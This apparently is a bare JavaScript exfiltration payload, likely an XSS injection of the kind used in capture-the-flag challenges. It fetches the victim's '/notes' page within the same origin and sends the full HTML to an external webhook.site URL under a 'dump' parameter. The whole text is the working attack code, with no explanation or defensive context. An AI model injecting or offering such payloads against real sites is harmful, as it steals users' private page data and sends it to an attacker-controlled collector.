const response = await fetch('/notes');
const html = await response.text();

fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?dump=' + encodeURIComponent(html));
